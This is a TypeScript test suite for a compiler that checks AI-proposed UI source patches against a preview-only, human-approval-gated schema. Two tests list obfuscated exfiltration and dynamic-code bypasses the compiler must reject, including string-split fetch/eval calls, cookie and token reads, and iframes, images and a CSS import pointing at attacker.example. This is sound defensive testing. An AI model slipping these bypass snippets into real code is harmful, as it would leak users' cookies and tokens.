import assert from "node:assert/strict";
import { test } from "node:test";

import { hashBytes } from "./canonical.js";
import { SourceEvolutionError } from "./errors.js";
import {
  compileModelPatch,
  compileStoredModelPatchForIntegrity,
  MODEL_PATCH_PROOF_CHECK_IDS,
  type SourcePatchProposal,
} from "./model-patch.js";

const PREIMAGE = [
  '"use client";',
  "",
  'const label = "Old label";',
  'const hint = "Old hint";',
  "",
  "export function Card() {",
  "  return <button>{label}</button>;",
  "}",
  "",
].join("\n");

function proposal(
  preimage = PREIMAGE,
  overrides: Partial<SourcePatchProposal> = {},
): SourcePatchProposal {
  return {
    schemaVersion: "living.source-patch-proposal/v1",
    proposalId: "patch.test.card-copy",
    appId: "app.test",
    opportunityId: "opportunity.test",
    manifestHash: `sha256:${"1".repeat(64)}`,
    briefId: "brief.test",
    summary: "Clarify the card action",
    rationale: "The bounded evidence supports clearer action copy.",
    target: {
      path: "src/components/card.tsx",
      preimageHash: hashBytes(preimage),
    },
    edits: [
      {
        anchor: 'const label = "Old label";',
        replacement: 'const label = "Review lead";',
      },
      {
        anchor: 'const hint = "Old hint";',
        replacement: 'const hint = "Open the selected record";',
      },
    ],
    governance: {
      status: "draft",
      humanApprovalRequired: true,
      applicationAllowed: false,
    },
    ...overrides,
  };
}

function expectCode(
  code: SourceEvolutionError["code"],
  run: () => unknown,
): void {
  assert.throws(
    run,
    (error: unknown) =>
      error instanceof SourceEvolutionError && error.code === code,
  );
}

test("compiles bounded exact-anchor edits deterministically", () => {
  const input = proposal(PREIMAGE, {
    edits: [...proposal().edits].reverse(),
  });
  const first = compileModelPatch(input, PREIMAGE);
  const second = compileModelPatch(input, PREIMAGE);

  assert.equal(
    first.postimage,
    PREIMAGE
      .replace('const label = "Old label";', 'const label = "Review lead";')
      .replace(
        'const hint = "Old hint";',
        'const hint = "Open the selected record";',
      ),
  );
  assert.equal(first.preimageHash, hashBytes(PREIMAGE));
  assert.equal(first.postimageHash, hashBytes(first.postimage));
  assert.deepEqual(first, second);
  assert.deepEqual(
    first.checks.map((check) => check.id),
    MODEL_PATCH_PROOF_CHECK_IDS,
  );
  assert.ok(first.checks.every((check) => check.status === "passed"));
  assert.deepEqual(first.diff, {
    editCount: 2,
    removedBytes: 50,
    addedBytes: 68,
    changedLines: 4,
  });
});

test("rejects unknown fields and edit counts outside one through eight", () => {
  expectCode("INVALID_INPUT", () =>
    compileModelPatch({ ...proposal(), unexpected: true }, PREIMAGE),
  );
  expectCode("INVALID_INPUT", () =>
    compileModelPatch({ ...proposal(), edits: [] }, PREIMAGE),
  );
  const anchors = Array.from({ length: 9 }, (_, index) => `anchor-${index}`);
  const source = anchors.join("\n");
  expectCode("INVALID_INPUT", () =>
    compileModelPatch(
      proposal(source, {
        edits: anchors.map((anchor) => ({
          anchor,
          replacement: `${anchor}-changed`,
        })),
      }),
      source,
    ),
  );
});

test("keeps every model patch preview-only at the schema boundary", () => {
  expectCode("INVALID_INPUT", () =>
    compileModelPatch(
      {
        ...proposal(),
        governance: {
          status: "approved",
          humanApprovalRequired: false,
          applicationAllowed: true,
        },
      },
      PREIMAGE,
    ),
  );
  expectCode("INVALID_INPUT", () =>
    compileModelPatch(
      {
        ...proposal(),
        schemaVersion: "living.source-patch-proposal/v2",
      },
      PREIMAGE,
    ),
  );
});

test("permits only bounded client source targets", () => {
  const unsafePaths = [
    "src/lib/card.tsx",
    "src/app/api/helper.ts",
    "src/app/api/route.ts",
    "src/app/leads/route.js",
    "src/components/card.test.tsx",
    "src/components/card.spec.tsx",
    "src/components/theme.config.ts",
    "src/components/tests/card.tsx",
    "src/components/config/card.tsx",
    "src/components/card.json",
    "src\\components\\card.tsx",
    "src/components/../card.tsx",
  ];
  for (const path of unsafePaths) {
    expectCode("UNSAFE_TARGET", () =>
      compileModelPatch(
        proposal(PREIMAGE, {
          target: { path, preimageHash: hashBytes(PREIMAGE) },
        }),
        PREIMAGE,
      ),
    );
  }

  const allowedTargets = [
    {
      path: "src/app/leads/page.tsx",
      preimage: PREIMAGE,
      anchor: 'const label = "Old label";',
      replacement: 'const label = "Review lead";',
    },
    {
      path: "src/components/card.ts",
      preimage: 'export const label: string = "Old";\n',
      anchor: '"Old"',
      replacement: '"Review"',
    },
    {
      path: "src/components/card.js",
      preimage: 'export const label = "Old";\n',
      anchor: '"Old"',
      replacement: '"Review"',
    },
    {
      path: "src/components/card.jsx",
      preimage: 'export const Card = () => <button>Old</button>;\n',
      anchor: "Old",
      replacement: "Review",
    },
    {
      path: "src/app/styles/page.css",
      preimage: ".card { color: red; }\n",
      anchor: "red",
      replacement: "blue",
    },
  ];
  for (const candidate of allowedTargets) {
    assert.equal(
      compileModelPatch(
        proposal(candidate.preimage, {
          target: {
            path: candidate.path,
            preimageHash: hashBytes(candidate.preimage),
          },
          edits: [{
            anchor: candidate.anchor,
            replacement: candidate.replacement,
          }],
        }),
        candidate.preimage,
      ).proposal.target.path,
      candidate.path,
    );
  }
});

test("requires the exact preimage hash", () => {
  expectCode("TARGET_PREIMAGE_MISMATCH", () =>
    compileModelPatch(
      proposal(PREIMAGE, {
        target: {
          path: "src/components/card.tsx",
          preimageHash: `sha256:${"2".repeat(64)}`,
        },
      }),
      PREIMAGE,
    ),
  );
});

test("requires unique, exactly-once, non-overlapping anchors", () => {
  const oneEdit = proposal().edits[0]!;
  expectCode("INVALID_INPUT", () =>
    compileModelPatch(
      proposal(PREIMAGE, { edits: [oneEdit, oneEdit] }),
      PREIMAGE,
    ),
  );
  expectCode("UNSUPPORTED_ADAPTER_INPUT", () =>
    compileModelPatch(
      proposal(PREIMAGE, {
        edits: [{ anchor: "missing anchor", replacement: "replacement" }],
      }),
      PREIMAGE,
    ),
  );

  const repeated = "const repeated = 1;\nconst repeated = 1;\n";
  expectCode("UNSUPPORTED_ADAPTER_INPUT", () =>
    compileModelPatch(
      proposal(repeated, {
        edits: [
          {
            anchor: "const repeated = 1;",
            replacement: "const repeated = 2;",
          },
        ],
      }),
      repeated,
    ),
  );

  const overlap = "const value = 1;\n";
  expectCode("INVALID_INPUT", () =>
    compileModelPatch(
      proposal(overlap, {
        edits: [
          { anchor: "const value = 1;", replacement: "const value = 2;" },
          { anchor: "value = 1", replacement: "value = 3" },
        ],
      }),
      overlap,
    ),
  );
});

test("rejects server, process, secret, network, and dynamic-code replacements", () => {
  const disallowed = [
    '"use server";\nconst next = 1;',
    'const next = fetch("/api/private");',
    "const next = process.env.VALUE;",
    'const next = import("./dynamic.js");',
    'const next = require("node:fs");',
    "const next = eval(source);",
    "const next = new Function(source);",
    'const password = "demo";',
    "const next = <div dangerouslySetInnerHTML={{ __html: source }} />;",
  ];
  for (const replacement of disallowed) {
    try {
      expectCode("UNSUPPORTED_ADAPTER_INPUT", () =>
        compileModelPatch(
          proposal(PREIMAGE, {
            edits: [
              {
                anchor: 'const label = "Old label";',
                replacement,
              },
            ],
          }),
          PREIMAGE,
        ),
      );
    } catch (error) {
      throw new Error("Accepted bypass: " + replacement, { cause: error });
    }
  }
});

test("rejects browser authority and common computed or obfuscated bypasses", () => {
  const disallowed = [
    'navigator.sendBeacon("/collect", payload);',
    'navigator["send" + "Beacon"]("/collect", payload);',
    'const nav = navigator; nav["send" + "Beacon"]("/collect", payload);',
    "const value = document.cookie;",
    'const value = document["coo" + "kie"];',
    'window["f" + "etch"]("/collect");',
    'const scope = window; scope["f" + "etch"]("/collect");',
    'globalThis[`ev` + `al`](source);',
    "const run = eval; run(encodedPayload);",
    'new self["XML" + "HttpRequest"]();',
    "const root = globalThis; root[dynamicName]();",
    'const script = document.createElement("script");',
    'const frame = document["create" + "Element"]("i" + "frame");',
    'const script = React.createElement("script", { src: "/bundle.js" });',
    '<iframe src={previewUrl} title="Remote preview" />',
    '<iframe src="https://attacker.example/collect" />',
    '<form action="/collect" method="post"><input name="value" /></form>',
    '<button formAction="/collect">Continue</button>',
    'form.setAttribute("ac" + "tion", endpoint);',
    'form["sub" + "mit"]();',
    'window.location.assign("/collect");',
    'window[String.fromCharCode(102, 101, 116, 99, 104)]("/collect");',
    "const image = new Image(); image.src = endpoint;",
    '<img alt="preview" src={"//attacker.example/" + value} />',
    "const socket = new WebSocket(endpoint);",
    'setTimeout("runDynamicCode()", 0);',
    '[]["filter"]["con" + "structor"]("return 1")();',
    'const value = localStorage["get" + "Item"]("token");',
    'const request = global\\u0054his["f\\x65tch"];',
    'const endpoint = "ht" + "tps://attacker.example/collect";',
    'const worker = new Worker("/worker.js");',
    'node.insertAdjacentHTML("beforeend", markup);',
    '@import url("//attacker.example/theme.css");',
  ];

  for (const replacement of disallowed) {
    try {
      expectCode("UNSUPPORTED_ADAPTER_INPUT", () =>
        compileModelPatch(
          proposal(PREIMAGE, {
            edits: [
              {
                anchor: 'const label = "Old label";',
                replacement,
              },
            ],
          }),
          PREIMAGE,
        ),
      );
    } catch (error) {
      throw new Error("Accepted browser bypass: " + replacement, {
        cause: error,
      });
    }
  }
});

test("rejects literal control bytes in model replacements", () => {
  expectCode("UNSUPPORTED_ADAPTER_INPUT", () =>
    compileModelPatch(
      proposal(PREIMAGE, {
        edits: [{
          anchor: 'const label = "Old label";',
          replacement: 'const label = "Broken";\u0000',
        }],
      }),
      PREIMAGE,
    ),
  );
});

test("keeps legacy invalid prepared artifacts readable but non-executable", () => {
  for (const replacement of [
    'const label = "Broken";\u0000',
    "const label = <section><span>Broken</section>;",
  ]) {
    const input = proposal(PREIMAGE, {
      edits: [{ anchor: 'const label = "Old label";', replacement }],
    });
    assert.doesNotThrow(() =>
      compileStoredModelPatchForIntegrity(input, PREIMAGE),
    );
    expectCode("UNSUPPORTED_ADAPTER_INPUT", () =>
      compileModelPatch(input, PREIMAGE),
    );
  }
});

test("rejects invisible format characters and excessive whitespace padding", () => {
  for (const replacement of [
    'const label = "zero\u200Bwidth";',
    `const label = "Review";${" ".repeat(1_025)}`,
    `const label = "Review";${"\n".repeat(129)}`,
  ]) {
    expectCode("UNSUPPORTED_ADAPTER_INPUT", () =>
      compileModelPatch(
        proposal(PREIMAGE, {
          edits: [{ anchor: 'const label = "Old label";', replacement }],
        }),
        PREIMAGE,
      ),
    );
  }
});

test("rejects explicit Unicode padding characters", () => {
  const paddingCodePoints = [
    0x00a0,
    0x1680,
    ...Array.from({ length: 11 }, (_, index) => 0x2000 + index),
    0x2028,
    0x2029,
    0x202f,
    0x205f,
    0x3000,
  ];
  for (const codePoint of paddingCodePoints) {
    expectCode("UNSUPPORTED_ADAPTER_INPUT", () =>
      compileModelPatch(
        proposal(PREIMAGE, {
          edits: [{
            anchor: 'const label = "Old label";',
            replacement: `const label = "Review";${String.fromCodePoint(codePoint)}`,
          }],
        }),
        PREIMAGE,
      ),
    );
  }
});

test("preserves an existing initial BOM and ordinary source whitespace", () => {
  const preimage = `\uFEFF${PREIMAGE}`;
  const compiled = compileModelPatch(
    proposal(preimage, {
      edits: [{
        anchor: 'const label = "Old label";',
        replacement: 'const label = "Review lead";\n\t',
      }],
    }),
    preimage,
  );

  assert.ok(compiled.postimage.startsWith("\uFEFF"));
  assert.match(compiled.postimage, /Review lead/u);
});
test("rejects syntactically incomplete TSX postimages", () => {
  expectCode("UNSUPPORTED_ADAPTER_INPUT", () =>
    compileModelPatch(
      proposal(PREIMAGE, {
        edits: [{
          anchor: 'const label = "Old label";',
          replacement: "const label = <section><span>Broken</section>;",
        }],
      }),
      PREIMAGE,
    ),
  );
});
test("keeps ordinary prose and local declarative UI references in bounds", () => {
  const allowed = [
    'const offset = 12; const copy = "The internet guide is available.";',
    'const panel = <Panel action={<button>Review</button>}>Ready</Panel>;',
    'const clip = <video controls src="/media/demo.mp4"><track src="/media/demo.vtt" /></video>;',
    'const preview = <iframe title="Local preview" src="/preview/current" />;',
    'const timer = window.setInterval(refreshPreview, 2_000);',
  ];

  for (const replacement of allowed) {
    const compiled = compileModelPatch(
      proposal(PREIMAGE, {
        edits: [
          {
            anchor: 'const label = "Old label";',
            replacement,
          },
        ],
      }),
      PREIMAGE,
    );
    assert.ok(compiled.postimage.includes(replacement));
  }
});

test("rejects no-op, empty, oversized source, postimage, and diff results", () => {
  expectCode("INVALID_INPUT", () =>
    compileModelPatch(
      proposal(PREIMAGE, {
        edits: [
          {
            anchor: 'const label = "Old label";',
            replacement: 'const label = "Old label";',
          },
        ],
      }),
      PREIMAGE,
    ),
  );

  const entireSource = "export const value = 1;";
  expectCode("UNSUPPORTED_ADAPTER_INPUT", () =>
    compileModelPatch(
      proposal(entireSource, {
        edits: [{ anchor: entireSource, replacement: "" }],
      }),
      entireSource,
    ),
  );

  const oversizedSource = "x".repeat(2_000_001);
  expectCode("INVALID_INPUT", () =>
    compileModelPatch(
      proposal(oversizedSource, {
        edits: [{ anchor: "x", replacement: "y" }],
      }),
      oversizedSource,
    ),
  );

  const nearLimitSource = `const marker = 1;\n${"x".repeat(1_999_000)}`;
  expectCode("UNSUPPORTED_ADAPTER_INPUT", () =>
    compileModelPatch(
      proposal(nearLimitSource, {
        edits: [
          {
            anchor: "const marker = 1;",
            replacement: `const marker = 2;\n${"y".repeat(15_000)}`,
          },
        ],
      }),
      nearLimitSource,
    ),
  );

  const diffAnchors = Array.from(
    { length: 8 },
    (_, index) => `anchor-${index}`,
  );
  const diffSource = `${diffAnchors.join("\n")}\n`;
  expectCode("UNSUPPORTED_ADAPTER_INPUT", () =>
    compileModelPatch(
      proposal(diffSource, {
        edits: diffAnchors.map((anchor) => ({
          anchor,
          replacement: "z".repeat(16_384),
        })),
      }),
      diffSource,
    ),
  );

  const lineSource = "const marker = 1;\n";
  expectCode("UNSUPPORTED_ADAPTER_INPUT", () =>
    compileModelPatch(
      proposal(lineSource, {
        edits: [
          {
            anchor: "const marker = 1;",
            replacement: Array.from({ length: 2_001 }, () => "x").join("\n"),
          },
        ],
      }),
      lineSource,
    ),
  );
});
